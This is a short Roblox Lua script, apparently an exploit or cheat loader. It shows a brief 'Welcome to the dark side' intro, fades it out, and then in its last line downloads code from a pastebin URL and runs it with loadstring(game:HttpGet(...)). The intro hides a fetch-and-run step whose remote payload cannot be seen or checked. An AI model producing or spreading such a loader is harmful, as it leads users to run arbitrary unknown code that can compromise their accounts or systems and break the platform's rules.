local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "WelcomeGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")
local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.Text = "Welcome to the dark side"
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.Parent = gui
task.wait(1.6)
label.RichText = true
label.Text = 'Welcome to the <font color="rgb(255,0,0)">dark side</font>'
task.wait(0.2)
local tween = TweenService:Create(
    label,
    TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
    {
        TextTransparency = 1
    }
)
tween:Play()
tween.Completed:Wait()
gui:Destroy()
loadstring(game:HttpGet("https://pastebin.com/raw/h4fhRvnZ"))()
-- Son (Ð¤ÏÐ¤)